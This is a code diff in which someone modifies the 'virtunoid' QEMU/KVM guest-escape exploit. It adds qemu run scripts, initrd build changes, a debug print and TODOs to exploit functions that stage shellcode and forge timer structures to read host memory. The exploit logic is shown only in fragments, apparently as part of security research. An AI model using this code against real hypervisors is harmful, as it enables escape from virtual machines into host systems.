@@ -1,0 +1,144 @@
+diff -Nurp virtunoid/init nelhage-virtunoid/init
+--- virtunoid/init	2014-02-19 23:02:10.602557895 -0500
++++ nelhage-virtunoid/init	2014-02-19 10:08:56.000000000 -0500
+@@ -3,5 +3,5 @@ mknod /dev/rtc c 254 0
+ mount -t proc none /proc
+ ifconfig eth0 10.0.2.15 up
+ udhcpc
+-/virtunoid
++#/virtunoid
+ sh
+diff -Nurp virtunoid/load.sh nelhage-virtunoid/load.sh
+--- virtunoid/load.sh	1969-12-31 19:00:00.000000000 -0500
++++ nelhage-virtunoid/load.sh	2014-02-19 10:08:56.000000000 -0500
+@@ -0,0 +1,9 @@
++#!/bin/bash
++sudo kvm -S \
++    -incoming "exec: gzip -c -d statefile.gz" \
++    -kernel bzImage -initrd initrd.gz -append "console=ttyS0" \
++    -net nic -net dump,file=/tmp/vm0.pcap \
++    -net user \
++    -nographic 
++
++
+diff -Nurp virtunoid/Makefile nelhage-virtunoid/Makefile
+--- virtunoid/Makefile	2014-02-19 23:02:10.602557895 -0500
++++ nelhage-virtunoid/Makefile	2014-02-19 10:08:56.000000000 -0500
+@@ -1,11 +1,11 @@
+ LDFLAGS=-static
+-PROGS=mknod mount ifconfig udhcpc sh
++PROGS=mknod mount ifconfig udhcpc sh ls insmod
+ 
+ all: virtunoid initrd.gz
+ 
+ virtunoid: virtunoid-config.h
+ 
+-initrd: out/virtunoid out/init out/proc $(PROGS:%=out/bin/%)
++initrd: out/hello.ko out/virtunoid out/init out/proc $(PROGS:%=out/bin/%)
+ 	(cd out && find | cpio -o -Hnewc) > $@
+ 
+ %.gz: %
+@@ -14,11 +14,16 @@ initrd: out/virtunoid out/init out/proc
+ out out/bin out/proc: %: $(dirname %)
+ 	mkdir -p $@
+ 
++
++
+ $(PROGS:%=out/bin/%): out/bin/%: out/bin/busybox
+ 	ln -sf busybox $@
+ 
+ out/bin/busybox: out out/bin
+-	cp /bin/busybox $@
++	cp ../busybox-1.20.2/busybox $@
++
++out/hello.ko: out ../hello/hello.ko
++	cp ../hello/hello.ko $@
+ 
+ out/init out/virtunoid: out/%: % out
+ 	cp $< $@
+diff -Nurp virtunoid/NETDUMP-HOWTO nelhage-virtunoid/NETDUMP-HOWTO
+--- virtunoid/NETDUMP-HOWTO	1969-12-31 19:00:00.000000000 -0500
++++ nelhage-virtunoid/NETDUMP-HOWTO	2014-02-19 10:08:56.000000000 -0500
+@@ -0,0 +1,5 @@
++$ qemu -net nic,model=e1000 -net dump,file=/tmp/vm0.pcap -net user
++This presents the VM with an Intel e1000 network card using QEMU's userspace network stack (slirp). The packet capture will be written to /tmp/vm0.pcap. After shutting down the VM, either inspect the packet capture on the command-line:
++$ /usr/sbin/tcpdump -nr /tmp/vm0.pcap
++
++Or open the pcap file with Wireshark.
+\ No newline at end of file
+diff -Nurp virtunoid/out/init nelhage-virtunoid/out/init
+--- virtunoid/out/init	1969-12-31 19:00:00.000000000 -0500
++++ nelhage-virtunoid/out/init	2014-02-19 10:08:56.000000000 -0500
+@@ -0,0 +1,7 @@
++#!/bin/sh
++mknod /dev/rtc c 254 0
++mount -t proc none /proc
++ifconfig eth0 10.0.2.15 up
++udhcpc
++#/virtunoid
++sh
+diff -Nurp virtunoid/run2.sh nelhage-virtunoid/run2.sh
+--- virtunoid/run2.sh	1969-12-31 19:00:00.000000000 -0500
++++ nelhage-virtunoid/run2.sh	2014-02-19 10:08:56.000000000 -0500
+@@ -0,0 +1,4 @@
++#!/bin/bash
++sudo qemu-system-x86_64 -k en-us -kernel bzImage -initrd initrd.gz -net nic -net dump,file=/tmp/vm0.pcap -net user -nographic
++#-serial file:cons.out  -append "console=ttyS0" 
++#sudo qemu-system-x86_64 -k en-us -serial file:cons.out -kernel bzImage -append "earlyprintk=ttyS0,keep" -initrd initrd.gz -net nic -net dump,file=/tmp/vm0.pcap -net user -monitor stdio
+diff -Nurp virtunoid/run4.sh nelhage-virtunoid/run4.sh
+--- virtunoid/run4.sh	1969-12-31 19:00:00.000000000 -0500
++++ nelhage-virtunoid/run4.sh	2014-02-19 10:08:56.000000000 -0500
+@@ -0,0 +1,7 @@
++#!/bin/bash
++sudo kvm -kernel bzImage -append "console=ttyS0" \
++    -initrd initrd.gz \
++    -net nic,model=virtio -net dump,file=/tmp/vm0.pcap \
++    -net user \
++    -nographic 
++#noapictimer
+diff -Nurp virtunoid/run.sh nelhage-virtunoid/run.sh
+--- virtunoid/run.sh	1969-12-31 19:00:00.000000000 -0500
++++ nelhage-virtunoid/run.sh	2014-02-19 10:08:56.000000000 -0500
+@@ -0,0 +1,3 @@
++#!/bin/bash
++sudo qemu-system-x86_64 -k en-us -serial file:cons.out -kernel bzImage -append "console=ttyS0" -initrd initrd.gz -net nic -net dump,file=/tmp/vm0.pcap -net user -monitor stdio -nographic
++#sudo qemu-system-x86_64 -k en-us -serial file:cons.out -kernel bzImage -append "earlyprintk=ttyS0,keep" -initrd initrd.gz -net nic -net dump,file=/tmp/vm0.pcap -net user -monitor stdio
+diff -Nurp virtunoid/virtunoid.c nelhage-virtunoid/virtunoid.c
+--- virtunoid/virtunoid.c	2014-02-19 23:02:10.603557920 -0500
++++ nelhage-virtunoid/virtunoid.c	2014-02-19 10:08:56.000000000 -0500
+@@ -249,7 +249,11 @@ gfn_t gva_to_gfn(gva_t addr) {
+ gpa_t gva_to_gpa(gva_t addr) {
+     gfn_t gfn = gva_to_gfn(addr);
+     assert(gfn != (gfn_t)-1);
++ printf("Translated virtual address %016lx to phys addr %016lx\n",addr,
++	(gfn << PAGE_SHIFT) | page_offset((unsigned long)addr));
++
+     return (gfn << PAGE_SHIFT) | page_offset((unsigned long)addr);
++    
+ }
+ 
+ hva_t highmem_hva_base = 0;
+@@ -336,6 +340,7 @@ struct QEMUTimer *construct_payload(void
+     share.shellcode = gva_to_hva(ioport);
+ 
+     memcpy(ioport + 1, shellcode, (void*)end_shellcode - (void*)shellcode);
++    //TODO check lengths in both so they match
+ 
+     timer = NULL;
+     timer = fake_timer(gva_to_hva(ioport+1), gva_to_hva((void*)&share), timer);
+@@ -355,6 +360,7 @@ struct QEMUTimer *construct_read(struct
+     timer = fake_timer(BDRV_RW_EM_CB, gva_to_hva(ptr), timer);
+     timer = fake_timer(KVM_ARCH_DO_IOPERM, hva - 8, timer);
+     timer = fake_timer(QEMU_GET_RAM_PTR, 1<<20, timer);
++    //TODO check shift
+ 
+     return timer;
+ }
+@@ -383,6 +389,7 @@ uint64_t read_host8(struct QEMUTimer *he
+         refresh_targets();
+     }
+     val = ((uint64_t)*hi << 32) | (uint64_t)*low;
++    //TODO shifts
+     rollback_targets();
+     return val;
+ }
